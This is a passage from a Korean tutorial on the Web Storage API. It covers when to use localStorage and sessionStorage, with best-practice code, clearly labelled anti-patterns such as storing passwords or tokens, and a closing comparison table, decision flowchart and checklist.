        <TestComponent />
      </ThemeProvider>
    );

    const toggleButton = screen.getByRole('button', { name: /테마 전환/i });

    // 초기 상태 확인
    expect(document.documentElement).toHaveAttribute('data-theme', 'light');

    // 테마 전환
    fireEvent.click(toggleButton);

    // 변경 확인
    expect(document.documentElement).toHaveAttribute('data-theme', 'dark');
    expect(localStorage.getItem('theme')).toBe('"dark"');
  });
});
```

---

## 모범 사례와 안티패턴

### 언제 localStorage를 사용해야 하는가

**적합한 사용 사례:**

| 사용 사례 | 이유 |
|----------|------|
| 사용자 UI 설정 (테마, 언어) | 개인화된 경험, 민감하지 않음 |
| 최근 검색어 | 편의 기능, 공개되어도 무방 |
| 폼 임시 저장 | 사용자 편의, 세션 유지 불필요 |
| 기능 플래그/A/B 테스트 | 일관된 경험 제공 |
| 캐시 (비민감 API 응답) | 성능 향상, 네트워크 절약 |
| 튜토리얼 완료 상태 | 반복 표시 방지 |

**부적합한 사용 사례:**

| 사용 사례 | 대안 |
|----------|------|
| 인증 토큰 | httpOnly Cookie |
| 개인 식별 정보 (PII) | 서버 측 저장 |
| 결제 정보 | 서버 측 암호화 저장 |
| 대용량 데이터 (> 5MB) | IndexedDB |
| 복잡한 쿼리가 필요한 데이터 | IndexedDB |
| 오프라인 앱 데이터 | IndexedDB + Service Worker |

### 모범 사례

```javascript
// 1. 키 네이밍 컨벤션
const STORAGE_KEYS = {
  USER_PREFERENCES: 'app:user:preferences',
  THEME: 'app:ui:theme',
  CACHE_PREFIX: 'app:cache:',
  SESSION: 'app:session:'
} as const;

// 2. 버전 관리
const STORAGE_VERSION = 'v2';

function migrateStorage() {
  const currentVersion = localStorage.getItem('app:version');

  if (currentVersion !== STORAGE_VERSION) {
    // 마이그레이션 로직
    if (currentVersion === 'v1') {
      // v1 -> v2 마이그레이션
      const oldData = localStorage.getItem('userData');
      if (oldData) {
        const parsed = JSON.parse(oldData);
        localStorage.setItem('app:user:preferences', JSON.stringify({
          ...parsed,
          migratedAt: Date.now()
        }));
        localStorage.removeItem('userData');
      }
    }

    localStorage.setItem('app:version', STORAGE_VERSION);
  }
}

// 3. 에러 처리 래퍼
function safeStorage(storage) {
  return {
    get(key, defaultValue = null) {
      try {
        const item = storage.getItem(key);
        return item ? JSON.parse(item) : defaultValue;
      } catch {
        return defaultValue;
      }
    },

    set(key, value) {
      try {
        storage.setItem(key, JSON.stringify(value));
        return true;
      } catch (error) {
        if (error.name === 'QuotaExceededError') {
          console.error('Storage 용량 초과');
          // 오래된 캐시 정리 시도
        }
        return false;
      }
    }
  };
}

// 4. 네임스페이스 분리
class NamespacedStorage {
  constructor(namespace) {
    this.prefix = `${namespace}:`;
  }

  getKey(key) {
    return `${this.prefix}${key}`;
  }

  set(key, value) {
    localStorage.setItem(this.getKey(key), JSON.stringify(value));
  }

  get(key) {
    const item = localStorage.getItem(this.getKey(key));
    return item ? JSON.parse(item) : null;
  }

  clear() {
    // 해당 네임스페이스의 키만 삭제
    Object.keys(localStorage)
      .filter(key => key.startsWith(this.prefix))
      .forEach(key => localStorage.removeItem(key));
  }
}

const userStorage = new NamespacedStorage('user');
const cacheStorage = new NamespacedStorage('cache');
```

### 안티패턴

```javascript
// 안티패턴 1: 민감 데이터 저장
localStorage.setItem('password', 'secret123'); // 절대 금지!
localStorage.setItem('accessToken', 'eyJhbGci...'); // 권장하지 않음

// 안티패턴 2: 에러 처리 없음
const data = JSON.parse(localStorage.getItem('data')); // null이면 에러!

// 안티패턴 3: 동기 API의 과도한 사용
for (let i = 0; i < 10000; i++) {
  localStorage.setItem(`item${i}`, `value${i}`); // UI 블로킹!
}

// 안티패턴 4: 용량 제한 무시
localStorage.setItem('hugeData', JSON.stringify(massiveObject)); // QuotaExceededError 가능

// 안티패턴 5: 버전 관리 없음
// 스키마가 변경되면 기존 데이터와 호환성 문제 발생

// 안티패턴 6: 전역 네임스페이스 오염
localStorage.setItem('data', '...'); // 다른 라이브러리와 충돌 가능
localStorage.setItem('user', '...'); // 너무 일반적인 키 이름
```

---

## 정리

### Web Storage API 핵심 포인트

| 항목 | localStorage | sessionStorage |
|------|-------------|----------------|
| 수명 | 영구적 | 탭/창 종료 시 삭제 |
| 범위 | 같은 출처의 모든 탭 | 해당 탭만 |
| 용량 | 5-10MB | 5-10MB |
| API | 동기 | 동기 |
| 보안 | XSS에 취약 | XSS에 취약 |

### 사용 결정 플로우차트

```
데이터 저장이 필요한가?
├── 민감한 데이터인가?
│   ├── 예 → 서버 저장 또는 httpOnly Cookie
│   └── 아니오 → 계속
├── 5MB 이상의 대용량인가?
│   ├── 예 → IndexedDB 사용
│   └── 아니오 → 계속
├── 복잡한 쿼리가 필요한가?
│   ├── 예 → IndexedDB 사용
│   └── 아니오 → 계속
├── 세션 종료 후에도 유지해야 하는가?
│   ├── 예 → localStorage
│   └── 아니오 → sessionStorage
```

### 체크리스트

- [ ] 민감한 데이터를 저장하지 않는가?
- [ ] JSON 직렬화/역직렬화 에러 처리가 되어 있는가?
- [ ] 용량 초과 에러 처리가 되어 있는가?
- [ ] Storage 지원 여부를 확인하는가?
- [ ] 키 네이밍 컨벤션을 따르는가?
- [ ] 필요시 만료 기능을 구현했는가?
- [ ] 버전 관리와 마이그레이션 전략이 있는가?

---

## 참고 자료

- [MDN Web Docs - Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)
- [MDN Web Docs - Window.localStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)
- [MDN Web Docs - Window.sessionStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage)
- [HTML Living Standard - Web Storage](https://html.spec.whatwg.org/multipage/webstorage.html)
- [OWASP - HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
- [web.dev - Storage for the web](https://web.dev/storage-for-the-web/)
